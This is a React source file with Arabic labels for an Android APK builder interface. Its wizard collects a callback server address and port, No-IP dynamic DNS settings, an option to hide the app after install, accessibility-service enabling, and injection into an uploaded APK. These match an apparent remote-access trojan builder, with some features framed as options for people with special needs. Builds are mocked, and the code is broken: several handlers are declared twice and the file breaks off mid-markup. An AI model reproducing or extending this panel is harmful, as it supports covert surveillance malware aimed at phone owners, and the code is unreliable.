import React, { useState, useEffect } from 'react';
import {
  Container,
  Paper,
  Typography,
  TextField,
  Button,
  Grid,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  Switch,
  FormControlLabel,
  Divider,
  Card,
  CardContent,
  CardActions,
  Stepper,
  Step,
  StepLabel,
  CircularProgress,
  Snackbar,
  makeStyles,
  IconButton,
  Tooltip,
} from '@material-ui/core';
import { Alert } from '@material-ui/lab';
import {
  Build as BuildIcon,
  CloudUpload as UploadIcon,
  GetApp as DownloadIcon,
  Delete as DeleteIcon,
  Refresh as RefreshIcon,
  Info as InfoIcon,
  PhotoCamera as CameraIcon,
  CheckCircle as CheckCircleIcon,
  Cancel as CancelIcon,
} from '@material-ui/icons';

const useStyles = makeStyles((theme) => ({
  container: {
    paddingTop: theme.spacing(4),
    paddingBottom: theme.spacing(4),
  },
  paper: {
    padding: theme.spacing(3),
    marginBottom: theme.spacing(3),
  },
  formControl: {
    marginBottom: theme.spacing(2),
    minWidth: '100%',
  },
  divider: {
    margin: theme.spacing(3, 0),
  },
  stepper: {
    backgroundColor: 'transparent',
    marginBottom: theme.spacing(3),
  },
  buttonContainer: {
    display: 'flex',
    justifyContent: 'flex-end',
    marginTop: theme.spacing(2),
  },
  button: {
    marginRight: theme.spacing(1),
  },
  uploadInput: {
    display: 'none',
  },
  iconPreview: {
    width: 100,
    height: 100,
    border: `1px solid ${theme.palette.divider}`,
    borderRadius: theme.shape.borderRadius,
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: theme.spacing(2),
    backgroundColor: theme.palette.background.default,
  },
  iconImage: {
    maxWidth: '100%',
    maxHeight: '100%',
  },
  buildCard: {
    marginBottom: theme.spacing(2),
  },
  buildStatus: {
    display: 'flex',
    alignItems: 'center',
    marginBottom: theme.spacing(1),
  },
  statusIcon: {
    marginRight: theme.spacing(1),
  },
  qrCode: {
    width: 150,
    height: 150,
    border: `1px solid ${theme.palette.divider}`,
    borderRadius: theme.shape.borderRadius,
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: theme.palette.background.default,
  },
  infoTooltip: {
    marginLeft: theme.spacing(1),
    fontSize: '1rem',
  },
}));

const ApkBuilder = () => {
  const classes = useStyles();
  const [activeStep, setActiveStep] = useState(0);
  const [loading, setLoading] = useState(false);
  const [builds, setBuilds] = useState([]);
  const [formData, setFormData] = useState({
    appName: '',
    packageName: 'com.company.app',
    versionName: '1.0.0',
    versionCode: 1,
    serverUrl: '',
    serverPort: '8080',
    useNoIp: false,
    noIpDomain: '',
    noIpInterval: 15,
    webViewUrl: '',
    notificationTitle: '',
    hideAfterInstall: false,
    accessibilityEnabled: false,
    minSdk: 21,
    targetSdk: 35,
    // خيارات جديدة للأشخاص ذوي الاحتياجات الخاصة
    injectApk: false,
    preventProgrammaticRedirection: false,
    specialAccessibilityOptions: false,
    textMagnification: false,
    highContrast: false,
    screenReader: false,
    textToSpeech: false,
    customConnectionPort: '',
    rebuildOption: false,
    apkToInject: null,
  });
  const [iconFile, setIconFile] = useState(null);
  const [iconPreview, setIconPreview] = useState(null);
  const [snackbar, setSnackbar] = useState({
    open: false,
    message: '',
    severity: 'success',
  });

  // محاكاة جلب بيانات البناء السابقة من الخادم
  useEffect(() => {
    const fetchBuilds = async () => {
      try {
        setLoading(true);
        
        // محاكاة تأخير الشبكة
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // بيانات وهمية للعرض
        const mockBuilds = [
          {
            id: '1',
            appName: 'تطبيق المبيعات',
            packageName: 'com.company.sales',
            versionName: '1.2.0',
            versionCode: 5,
            buildStatus: 'completed',
            createdAt: '2023-06-10T14:30:00',
            buildOutput: {
              apkPath: '/downloads/sales-app-1.2.0.apk',
              downloadUrl: 'https://example.com/downloads/sales-app-1.2.0.apk',
              qrCode: 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://example.com/downloads/sales-app-1.2.0.apk',
            },
          },
          {
            id: '2',
            appName: 'تطبيق خدمة العملاء',
            packageName: 'com.company.support',
            versionName: '1.0.0',
            versionCode: 1,
            buildStatus: 'completed',
            createdAt: '2023-06-05T10:15:00',
            buildOutput: {
              apkPath: '/downloads/support-app-1.0.0.apk',
              downloadUrl: 'https://example.com/downloads/support-app-1.0.0.apk',
              qrCode: 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://example.com/downloads/support-app-1.0.0.apk',
            },
          },
          {
            id: '3',
            appName: 'تطبيق الموارد البشرية',
            packageName: 'com.company.hr',
            versionName: '1.1.0',
            versionCode: 3,
            buildStatus: 'failed',
            createdAt: '2023-06-12T09:45:00',
            buildOutput: {
              error: 'فشل في تجميع التطبيق: خطأ في ملف الأيقونة',
            },
          },
          {
            id: '4',
            appName: 'تطبيق المخزون',
            packageName: 'com.company.inventory',
            versionName: '1.0.0',
            versionCode: 1,
            buildStatus: 'in_progress',
            createdAt: '2023-06-15T11:30:00',
          },
        ];
        
        setBuilds(mockBuilds);
      } catch (error) {
        console.error('Error fetching builds:', error);
        setSnackbar({
          open: true,
          message: 'حدث خطأ أثناء جلب بيانات البناء السابقة',
          severity: 'error',
        });
      } finally {
        setLoading(false);
      }
    };
    
    fetchBuilds();
  }, []);

  const steps = ['معلومات التطبيق', 'إعدادات الخادم', 'خيارات متقدمة', 'خيارات ذوي الاحتياجات الخاصة', 'بناء التطبيق'];

  const handleNext = () => {
    if (validateStep(activeStep)) {
      setActiveStep((prevActiveStep) => prevActiveStep + 1);
    } else {
      setSnackbar({
        open: true,
        message: 'يرجى ملء جميع الحقول المطلوبة قبل المتابعة',
        severity: 'error',
      });
    }
  };

  const handleBack = () => {
    setActiveStep((prevActiveStep) => prevActiveStep - 1);
  };

  const handleReset = () => {
    setActiveStep(0);
    setFormData({
      appName: '',
      packageName: 'com.company.app',
      versionName: '1.0.0',
      versionCode: 1,
      serverUrl: '',
      serverPort: '8080',
      useNoIp: false,
      noIpDomain: '',
      noIpInterval: 15,
      webViewUrl: '',
      notificationTitle: '',
      hideAfterInstall: false,
      accessibilityEnabled: false,
      minSdk: 21,
      targetSdk: 35,
      // إعادة تعيين الخيارات الجديدة
      injectApk: false,
      preventProgrammaticRedirection: false,
      specialAccessibilityOptions: false,
      textMagnification: false,
      highContrast: false,
      screenReader: false,
      textToSpeech: false,
      customConnectionPort: '',
      rebuildOption: false,
      apkToInject: null,
    });
    setIconFile(null);
    setIconPreview(null);
  };

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
  };

  const handleIconChange = (e) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setIconFile(file);
      
      const reader = new FileReader();
      reader.onload = (event) => {
        setIconPreview(event.target.result);
      };
      reader.readAsDataURL(file);
    }
  };
  
  // التحقق من صحة البيانات قبل الانتقال للخطوة التالية
  const validateStep = (step) => {
    switch (step) {
      case 0: // معلومات التطبيق
        return formData.appName && formData.packageName && formData.versionName && formData.versionCode;
      case 1: // إعدادات الخادم
        return formData.serverUrl && formData.serverPort && (!formData.useNoIp || (formData.useNoIp && formData.noIpDomain));
      case 2: // خيارات متقدمة
        return true; // لا توجد حقول إلزامية في هذه الخطوة
      case 3: // خيارات ذوي الاحتياجات الخاصة
        return !formData.injectApk || (formData.injectApk && formData.apkToInject);
      default:
        return true;
    }
  };

  const handleBuild = async () => {
    try {
      setLoading(true);
      
      // محاكاة تأخير الشبكة
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      // إضافة معلومات إضافية للبناء بناءً على الخيارات الجديدة
      const buildDetails = formData.injectApk ? 'تطبيق محقون' : 'تطبيق جديد';
      
      // تحديث معلومات إمكانية الوصول لتشمل الخيارات الجديدة
      let accessibilityInfo = '';
      if (formData.specialAccessibilityOptions) {
        accessibilityInfo = ' مع خيارات إمكانية وصول متقدمة';
        
        const accessibilityFeatures = [];
        if (formData.textMagnification) accessibilityFeatures.push('تكبير النص');
        if (formData.highContrast) accessibilityFeatures.push('تباين عالي');
        if (formData.screenReader) accessibilityFeatures.push('قارئ الشاشة');
        if (formData.textToSpeech) accessibilityFeatures.push('تحويل النص إلى كلام');
        
        if (accessibilityFeatures.length > 0) {
          accessibilityInfo += ' (' + accessibilityFeatures.join(', ') + ')';
        }
      }
      const newBuild = {
        id: Date.now().toString(),
        ...formData,
        buildType: buildDetails + accessibilityInfo,
        buildStatus: 'completed',
        createdAt: new Date().toISOString(),
        buildOutput: {
          apkPath: `/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
          downloadUrl: `https://example.com/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
          qrCode: `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://example.com/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
        },
      };
      
      setBuilds([newBuild, ...builds]);
      
      setSnackbar({
        open: true,
        message: 'تم بناء التطبيق بنجاح!',
        severity: 'success',
      });
      
      handleReset();
    } catch (error) {
      console.error('Error building APK:', error);
      setSnackbar({
        open: true,
        message: 'حدث خطأ أثناء بناء التطبيق',
        severity: 'error',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteBuild = async (buildId) => {
    try {
      setLoading(true);
      
      // محاكاة تأخير الشبكة
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      const updatedBuilds = builds.filter(build => build.id !== buildId);
      setBuilds(updatedBuilds);
      
      setSnackbar({
        open: true,
        message: 'تم حذف البناء بنجاح',
        severity: 'success',
      });
    } catch (error) {
      console.error('Error deleting build:', error);
      setSnackbar({
        open: true,
        message: 'حدث خطأ أثناء حذف البناء',
        severity: 'error',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCloseSnackbar = () => {
    setSnackbar({
      ...snackbar,
      open: false,
    });
  };

  const getStepContent = (step) => {
    switch (step) {
      case 0: // معلومات التطبيق
        return (
          <>
            <Typography variant="h6" gutterBottom>
              معلومات التطبيق الأساسية
            </Typography>
            
            <FormControl className={classes.formControl}>
              <TextField
                label="اسم التطبيق"
                name="appName"
                value={formData.appName}
                onChange={handleChange}
                fullWidth
                required
                helperText="الاسم الذي سيظهر للمستخدم"
              />
            </FormControl>
            
            <FormControl className={classes.formControl}>
              <TextField
                label="اسم الحزمة"
                name="packageName"
                value={formData.packageName}
                onChange={handleChange}
                fullWidth
                required
                helperText="معرف فريد للتطبيق (مثال: com.company.app)"
              />
            </FormControl>
            
            <Grid container spacing={2}>
              <Grid item xs={12} sm={6}>
                <FormControl className={classes.formControl}>
                  <TextField
                    label="اسم الإصدار"
                    name="versionName"
                    value={formData.versionName}
                    onChange={handleChange}
                    fullWidth
                    required
                    helperText="رقم الإصدار المرئي (مثال: 1.0.0)"
                  />
                </FormControl>
              </Grid>
              <Grid item xs={12} sm={6}>
                <FormControl className={classes.formControl}>
                  <TextField
                    label="رمز الإصدار"
                    name="versionCode"
                    type="number"
                    value={formData.versionCode}
                    onChange={handleChange}
                    fullWidth
                    required
                    helperText="رقم الإصدار الداخلي (يجب زيادته مع كل إصدار)"
                  />
                </FormControl>
              </Grid>
            </Grid>
            
            <Typography variant="subtitle1" gutterBottom style={{ marginTop: '16px' }}>
              أيقونة التطبيق
            </Typography>
            
            <div className={classes.iconPreview}>
              {iconPreview ? (
                <img src={iconPreview} alt="أيقونة التطبيق" className={classes.iconImage} />
              ) : (
                <BuildIcon color="disabled" style={{ fontSize: 40 }} />
              )}
            </div>
            
            <input
              accept="image/*"
              className={classes.uploadInput}
              id="icon-button-file"
              type="file"
              onChange={handleIconChange}
            />
            <label htmlFor="icon-button-file">
              <Button
                variant="contained"
                color="default"
                component="span"
                startIcon={<CameraIcon />}
              >
                اختر أيقونة
              </Button>
            </label>
          </>
        );
      
      case 1: // إعدادات الخادم
        return (
          <>
            <Typography variant="h6" gutterBottom>
              إعدادات الاتصال بالخادم
            </Typography>
            
            <FormControl className={classes.formControl}>
              <TextField
                label="عنوان الخادم"
                name="serverUrl"
                value={formData.serverUrl}
                onChange={handleChange}
                fullWidth
                required
                helperText="عنوان IP أو اسم المضيف للخادم"
              />
            </FormControl>
            
            <FormControl className={classes.formControl}>
              <TextField
                label="منفذ الخادم"
                name="serverPort"
                value={formData.serverPort}
                onChange={handleChange}
                fullWidth
                required
                helperText="رقم المنفذ الذي يستمع عليه الخادم"
              />
            </FormControl>
            
            <FormControlLabel
              control={
                <Switch
                  checked={formData.useNoIp}
                  onChange={handleChange}
                  name="useNoIp"
                  color="primary"
                />
              }
              label="استخدام No-IP"
            />
            
            {formData.useNoIp && (
              <>
                <FormControl className={classes.formControl}>
                  <TextField
                    label="نطاق No-IP"
                    name="noIpDomain"
                    value={formData.noIpDomain}
                    onChange={handleChange}
                    fullWidth
                    required
                    helperText="نطاق No-IP الخاص بك (مثال: myserver.ddns.net)"
                  />
                </FormControl>
                
                <FormControl className={classes.formControl}>
                  <TextField
                    label="فترة التحديث (دقائق)"
                    name="noIpInterval"
                    type="number"
                    value={formData.noIpInterval}
                    onChange={handleChange}
                    fullWidth
                    required
                    helperText="الفترة الزمنية بين تحديثات No-IP (بالدقائق)"
                  />
                </FormControl>
              </>
            )}
          </>
        );
      
      case 2: // خيارات متقدمة
        return (
          <>
            <Typography variant="h6" gutterBottom>
              خيارات متقدمة
            </Typography>
            
            <FormControl className={classes.formControl}>
              <TextField
                label="رابط عرض الويب"
                name="webViewUrl"
                value={formData.webViewUrl}
                onChange={handleChange}
                fullWidth
                helperText="رابط موقع الويب لعرضه في التطبيق (اتركه فارغًا إذا لم تكن بحاجة إليه)"
              />
            </FormControl>
            
            <FormControl className={classes.formControl}>
              <TextField
                label="عنوان الإشعار"
                name="notificationTitle"
                value={formData.notificationTitle}
                onChange={handleChange}
                fullWidth
                helperText="عنوان الإشعار الدائم (اتركه فارغًا لعدم إظهار إشعار)"
              />
            </FormControl>
            
            <FormControlLabel
              control={
                <Switch
                  checked={formData.hideAfterInstall}
                  onChange={handleChange}
                  name="hideAfterInstall"
                  color="primary"
                />
              }
              label="إخفاء التطبيق بعد التثبيت"
            />
            
            <FormControlLabel
              control={
                <Switch
                  checked={formData.accessibilityEnabled}
                  onChange={handleChange}
                  name="accessibilityEnabled"
                  color="primary"
                />
              }
              label="تمكين خدمات إمكانية الوصول"
            />
            
            <Divider className={classes.divider} />
            
            <Typography variant="h6" gutterBottom>
              إعدادات SDK
            </Typography>
            
            <Grid container spacing={2}>
              <Grid item xs={12} sm={6}>
                <FormControl className={classes.formControl}>
                  <InputLabel>الحد الأدنى لـ SDK</InputLabel>
                  <Select
                    name="minSdk"
                    value={formData.minSdk}
                    onChange={handleChange}
                    fullWidth
                  >
                    <MenuItem value={21}>Android 5.0 (API 21)</MenuItem>
                    <MenuItem value={23}>Android 6.0 (API 23)</MenuItem>
                    <MenuItem value={26}>Android 8.0 (API 26)</MenuItem>
                    <MenuItem value={29}>Android 10.0 (API 29)</MenuItem>
                    <MenuItem value={33}>Android 13.0 (API 33)</MenuItem>
                  </Select>
                </FormControl>
              </Grid>
              <Grid item xs={12} sm={6}>
                <FormControl className={classes.formControl}>
                  <InputLabel>SDK المستهدف</InputLabel>
                  <Select
                    name="targetSdk"
                    value={formData.targetSdk}
                    onChange={handleChange}
                    fullWidth
                  >
                    <MenuItem value={33}>Android 13.0 (API 33)</MenuItem>
                    <MenuItem value={34}>Android 14.0 (API 34)</MenuItem>
                    <MenuItem value={35}>Android 15.0 (API 35)</MenuItem>
                  </Select>
                </FormControl>
              </Grid>
            </Grid>
          </>
        );
      
      case 3: // خيارات ذوي الاحتياجات الخاصة
        return (
          <>
            <Typography variant="h6" gutterBottom>
              خيارات ذوي الاحتياجات الخاصة
            </Typography>
            
            <Paper elevation={2} style={{ padding: '16px', marginBottom: '16px' }}>
              <Typography variant="subtitle1" gutterBottom>
                خيارات حقن التطبيق وإعادة البناء
              </Typography>
              
              <FormControlLabel
                control={
                  <Switch
                    checked={formData.injectApk}
                    onChange={handleChange}
                    name="injectApk"
                    color="primary"
                  />
                }
                label="حقن التطبيق"
              />
              
              {formData.injectApk && (
                <>
                  <Typography variant="body2" color="textSecondary" gutterBottom>
                    قم بتحميل ملف APK لحقنه بالوظائف المطلوبة
                  </Typography>
                  
                  <input
                    accept=".apk"
                    className={classes.uploadInput}
                    id="apk-file-upload"
                    type="file"
                    onChange={(e) => {
                      if (e.target.files && e.target.files[0]) {
                        setFormData({
                          ...formData,
                          apkToInject: e.target.files[0]
                        });
                      }
                    }}
                  />
                  <label htmlFor="apk-file-upload">
                    <Button
                      variant="contained"
                      color="default"
                      component="span"
                      startIcon={<UploadIcon />}
                      style={{ marginBottom: '16px' }}
                    >
                      اختر ملف APK
                    </Button>
                  </label>
                  
                  {formData.apkToInject && (
                    <Typography variant="body2" style={{ marginBottom: '16px' }}>
                      تم اختيار: {formData.apkToInject.name}
                    </Typography>
                  )}
                </>
              )}
              
              <FormControlLabel
                control={
                  <Switch
                    checked={formData.rebuildOption}
                    onChange={handleChange}
                    name="rebuildOption"
                    color="primary"
                  />
                }
                label="خيار إعادة البناء"
              />
            </Paper>
            
            <Paper elevation={2} style={{ padding: '16px', marginBottom: '16px' }}>
              <Typography variant="subtitle1" gutterBottom>
                خيارات الاتصال المتقدمة
              </Typography>
              
              <FormControl className={classes.formControl}>
                <TextField
                  label="منفذ اتصال مخصص"
                  name="customConnectionPort"
                  value={formData.customConnectionPort}
                  onChange={handleChange}
                  fullWidth
                  helperText="أدخل رقم منفذ مخصص للاتصال (اختياري)"
                />
              </FormControl>
              
              <FormControlLabel
                control={
                  <Switch
                    checked={formData.preventProgrammaticRedirection}
                    onChange={handleChange}
                    name="preventProgrammaticRedirection"
                    color="primary"
                  />
                }
                label="منع التحويل البرمجي"
              />
            </Paper>
            
            <Paper elevation={2} style={{ padding: '16px' }}>
              <Typography variant="subtitle1" gutterBottom>
                خيارات إمكانية الوصول المتقدمة
              </Typography>
              
              <FormControlLabel
                control={
                  <Switch
                    checked={formData.specialAccessibilityOptions}
                    onChange={handleChange}
                    name="specialAccessibilityOptions"
                    color="primary"
                  />
                }
                label="تمكين خيارات إمكانية الوصول المتقدمة"
              />
              
              {formData.specialAccessibilityOptions && (
                <Grid container spacing={2} style={{ marginTop: '8px' }}>
                  <Grid item xs={12} sm={6}>
                    <FormControlLabel
                      control={
                        <Switch
                          checked={formData.textMagnification || false}
                          onChange={handleChange}
                          name="textMagnification"
                          color="primary"
                        />
                      }
                      label="تكبير النص"
                    />
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <FormControlLabel
                      control={
                        <Switch
                          checked={formData.highContrast || false}
                          onChange={handleChange}
                          name="highContrast"
                          color="primary"
                        />
                      }
                      label="تباين عالي"
                    />
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <FormControlLabel
                      control={
                        <Switch
                          checked={formData.screenReader || false}
                          onChange={handleChange}
                          name="screenReader"
                          color="primary"
                        />
                      }
                      label="قارئ الشاشة"
                    />
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <FormControlLabel
                      control={
                        <Switch
                          checked={formData.textToSpeech || false}
                          onChange={handleChange}
                          name="textToSpeech"
                          color="primary"
                        />
                      }
                      label="تحويل النص إلى كلام"
                    />
                  </Grid>
                </Grid>
              )}
            </Paper>
          </>
        );
      
      case 4: // بناء التطبيق
        return (
          <>
            <Typography variant="h6" gutterBottom>
              ملخص إعدادات التطبيق
            </Typography>
            
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle1">معلومات التطبيق</Typography>
                <Typography variant="body2">اسم التطبيق: {formData.appName}</Typography>
                <Typography variant="body2">اسم الحزمة: {formData.packageName}</Typography>
                <Typography variant="body2">الإصدار: {formData.versionName} (رمز: {formData.versionCode})</Typography>
                
                <Typography variant="subtitle1" style={{ marginTop: '16px' }}>إعدادات الخادم</Typography>
                <Typography variant="body2">عنوان الخادم: {formData.serverUrl}</Typography>
                <Typography variant="body2">منفذ الخادم: {formData.serverPort}</Typography>
                {formData.useNoIp && (
                  <>
                    <Typography variant="body2">نطاق No-IP: {formData.noIpDomain}</Typography>
                    <Typography variant="body2">فترة التحديث: {formData.noIpInterval} دقيقة</Typography>
                  </>
                )}
              </Grid>
              
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle1">الخيارات المتقدمة</Typography>
                {formData.webViewUrl && (
                  <Typography variant="body2">رابط عرض الويب: {formData.webViewUrl}</Typography>
                )}
                {formData.notificationTitle && (
                  <Typography variant="body2">عنوان الإشعار: {formData.notificationTitle}</Typography>
                )}
                <Typography variant="body2">إخفاء بعد التثبيت: {formData.hideAfterInstall ? 'نعم' : 'لا'}</Typography>
                <Typography variant="body2">خدمات إمكانية الوصول: {formData.accessibilityEnabled ? 'ممكّنة' : 'معطلة'}</Typography>
                
                <Typography variant="subtitle1" style={{ marginTop: '16px' }}>إعدادات SDK</Typography>
                <Typography variant="body2">الحد الأدنى لـ SDK: {formData.minSdk}</Typography>
                <Typography variant="body2">SDK المستهدف: {formData.targetSdk}</Typography>
                
                <Typography variant="subtitle1" style={{ marginTop: '16px' }}>خيارات ذوي الاحتياجات الخاصة</Typography>
                <Typography variant="body2">حقن التطبيق: {formData.injectApk ? 'ممكّن' : 'معطل'}</Typography>
                {formData.injectApk && formData.apkToInject && (
                  <Typography variant="body2">ملف APK: {formData.apkToInject.name}</Typography>
                )}
                <Typography variant="body2">منع التحويل البرمجي: {formData.preventProgrammaticRedirection ? 'ممكّن' : 'معطل'}</Typography>
                <Typography variant="body2">خيارات إمكانية الوصول المتقدمة: {formData.specialAccessibilityOptions ? 'ممكّنة' : 'معطلة'}</Typography>
                {formData.specialAccessibilityOptions && (
                  <>
                    <Typography variant="body2">تكبير النص: {formData.textMagnification ? 'ممكّن' : 'معطل'}</Typography>
                    <Typography variant="body2">تباين عالي: {formData.highContrast ? 'ممكّن' : 'معطل'}</Typography>
                    <Typography variant="body2">قارئ الشاشة: {formData.screenReader ? 'ممكّن' : 'معطل'}</Typography>
                    <Typography variant="body2">تحويل النص إلى كلام: {formData.textToSpeech ? 'ممكّن' : 'معطل'}</Typography>
                  </>
                )}
                {formData.customConnectionPort && (
                  <Typography variant="body2">منفذ اتصال مخصص: {formData.customConnectionPort}</Typography>
                )}
                <Typography variant="body2">خيار إعادة البناء: {formData.rebuildOption ? 'ممكّن' : 'معطل'}</Typography>
              </Grid>
            </Grid>
            
            <div className={classes.buttonContainer}>
              <Button
                variant="contained"
                color="primary"
                onClick={handleBuild}
                disabled={loading || !formData.appName || !formData.packageName || !formData.serverUrl}
                startIcon={loading ? <CircularProgress size={24} /> : <BuildIcon />}
              >
                {loading ? 'جاري البناء...' : 'بناء التطبيق'}
              </Button>
            </div>
          </>
        );
      
      default:
        return 'خطوة غير معروفة';
    }
  };
  
  const handleBack = () => {
    setActiveStep((prevActiveStep) => prevActiveStep - 1);
  };

  const handleReset = () => {
    setActiveStep(0);
    setFormData({
      appName: '',
      packageName: 'com.company.app',
      versionName: '1.0.0',
      versionCode: 1,
      serverUrl: '',
      serverPort: '8080',
      useNoIp: false,
      noIpDomain: '',
      noIpInterval: 15,
      webViewUrl: '',
      notificationTitle: '',
      hideAfterInstall: false,
      accessibilityEnabled: false,
      minSdk: 21,
      targetSdk: 35,
      // إعادة تعيين الخيارات الجديدة
      injectApk: false,
      preventProgrammaticRedirection: false,
      specialAccessibilityOptions: false,
      customConnectionPort: '',
      rebuildOption: false,
      apkToInject: null,
    });
    setIconFile(null);
    setIconPreview(null);
  };

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
  };

  const handleIconChange = (e) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setIconFile(file);
      
      const reader = new FileReader();
      reader.onload = (event) => {
        setIconPreview(event.target.result);
      };
      reader.readAsDataURL(file);
    }
  };
  
  // التحقق من صحة البيانات قبل الانتقال للخطوة التالية
  const validateStep = (step) => {
    switch (step) {
      case 0: // معلومات التطبيق
        return formData.appName && formData.packageName && formData.versionName && formData.versionCode;
      case 1: // إعدادات الخادم
        return formData.serverUrl && formData.serverPort && (!formData.useNoIp || (formData.useNoIp && formData.noIpDomain));
      case 2: // خيارات متقدمة
        return true; // لا توجد حقول إلزامية في هذه الخطوة
      case 3: // خيارات ذوي الاحتياجات الخاصة
        return !formData.injectApk || (formData.injectApk && formData.apkToInject);
      default:
        return true;
    }
  };

  const handleBuild = async () => {
    try {
      setLoading(true);
      
      // محاكاة تأخير الشبكة
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      // إضافة معلومات إضافية للبناء بناءً على الخيارات الجديدة
      const buildDetails = formData.injectApk ? 'تطبيق محقون' : 'تطبيق جديد';
      const accessibilityInfo = formData.specialAccessibilityOptions ? ' مع خيارات إمكانية وصول متقدمة' : '';
      const newBuild = {
        id: Date.now().toString(),
        ...formData,
        buildType: buildDetails + accessibilityInfo,
        buildStatus: 'completed',
        createdAt: new Date().toISOString(),
        buildOutput: {
          apkPath: `/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
          downloadUrl: `https://example.com/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
          qrCode: `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://example.com/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
        },
      };
      
      setBuilds([newBuild, ...builds]);
      
      setSnackbar({
        open: true,
        message: 'تم بناء التطبيق بنجاح!',
        severity: 'success',
      });
      
      handleReset();
    } catch (error) {
      console.error('Error building APK:', error);
      setSnackbar({
        open: true,
        message: 'حدث خطأ أثناء بناء التطبيق',
        severity: 'error',
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Container maxWidth="lg" className={classes.container}>
      <Typography variant="h4" component="h1" gutterBottom>
        مولّد تطبيقات الأندرويد
      </Typography>
      
      {/* مراحل البناء */}
      <Paper className={classes.paper}>
        <Stepper activeStep={activeStep} className={classes.stepper}>
          {steps.map((label) => (
            <Step key={label}>
              <StepLabel>{label}</StepLabel>
            </Step>
          ))}
        </Stepper>
        
        {getStepContent(activeStep)}
        
        <div className={classes.buttonContainer}>
          <Button
            disabled={activeStep === 0}
            onClick={handleBack}
            className={classes.button}
          >
            السابق
          </Button>
          
          {activeStep < steps.length - 1 ? (
            <Button
              variant="contained"
              color="primary"
              onClick={handleNext}
              className={classes.button}
              disabled={activeStep === 0 && (!formData.appName || !formData.packageName)}
            >
              التالي
            </Button>
          ) : null}
        </div>
      </Paper>
      
      {/* عمليات البناء السابقة */}
      <Typography variant="h5" gutterBottom>
        عمليات البناء السابقة
      </Typography>
      
      <Grid container spacing={3}>
        {loading && builds.length === 0 ? (
          <Grid item xs={12}>
            <Paper className={classes.paper} style={{ textAlign: 'center', padding: '40px' }}>
              <CircularProgress />
              <Typography variant="body1" style={{ marginTop: '16px' }}>
                جاري تحميل عمليات البناء السابقة...
              </Typography>
            </Paper>
          </Grid>
        ) : builds.length > 0 ? (
          builds.map((build) => (
            <Grid item xs={12} md={6} key={build.id}>
              <Card className={classes.buildCard}>
                <CardContent>
                  <Typography variant="h6">{build.appName}</Typography>
                  <Typography variant="body2" color="textSecondary">
                    {build.packageName} | الإصدار: {build.versionName}
                  </Typography>
                  
                  {build.buildType && (
                    <Typography variant="body2" color="textSecondary" style={{ marginTop: '4px' }}>
                      نوع البناء: {build.buildType}
                    </Typography>
                  )}
                  
                  <div className={classes.buildStatus}>
                    {build.buildStatus === 'completed' && (
                      <>
                        <CheckCircleIcon color="primary" className={classes.statusIcon} />
                        <Typography>تم البناء بنجاح</Typography>
                      </>
                    )}
                    {build.buildStatus === 'failed' && (
                      <>
                        <CancelIcon color="error" className={classes.statusIcon} />
                        <Typography>فشل البناء</Typography>
                      </>
                    )}
                    {build.buildStatus === 'in_progress' && (
                      <>
                        <CircularProgress size={20} className={classes.statusIcon} />
                        <Typography>جاري البناء...</Typography>
                      </>
                    )}
                  </div>
                  
                  <Typography variant="body2" color="textSecondary">
                    تاريخ البناء: {new Date(build.createdAt).toLocaleString('ar-SA')}
                  </Typography>
                  
                  {build.buildStatus === 'failed' && build.buildOutput?.error && (
                    <Alert severity="error" style={{ marginTop: '8px' }}>
                      {build.buildOutput.error}
                    </Alert>
                  )}
                  
                  {build.buildStatus === 'completed' && build.buildOutput && (
                    <Grid container spacing={2} style={{ marginTop: '8px' }}>
                      <Grid item xs={12} sm={6}>
                        <Typography variant="subtitle2">رابط التحميل:</Typography>
                        <Typography variant="body2" noWrap>
                          {build.buildOutput.downloadUrl}
                        </Typography>
                      </Grid>
                      <Grid item xs={12} sm={6}>
                        <div className={classes.qrCode}>
                          <img 
                            src={build.buildOutput.qrCode} 
                            alt="QR Code" 
                            style={{ maxWidth: '100%', maxHeight: '100%' }} 
                          />
                        </div>
                      </Grid>
                    </Grid>
                  )}
                </CardContent>
                
                <CardActions>
                  {build.buildStatus === 'completed' && (
                    <Button
                      startIcon={<DownloadIcon />}
                      color="primary"
                      onClick={() => window.open(build.buildOutput.downloadUrl, '_blank')}
                    >
                      تحميل
                    </Button>
                  )}
                  
                  {build.buildStatus === 'failed' && (
                    <Button
                      startIcon={<RefreshIcon />}
                      color="primary"
                      onClick={() => alert('سيتم تفعيل هذه الميزة لاحقًا')}
                    >
                      إعادة المحاولة
                    </Button>
                  )}
                  
                  <Button
                    startIcon={<DeleteIcon />}
                    color="secondary"
                    onClick={() => handleDeleteBuild(build.id)}
                  >
                    حذف
                  </Button>
                </CardActions>
              </Card>
            </Grid>
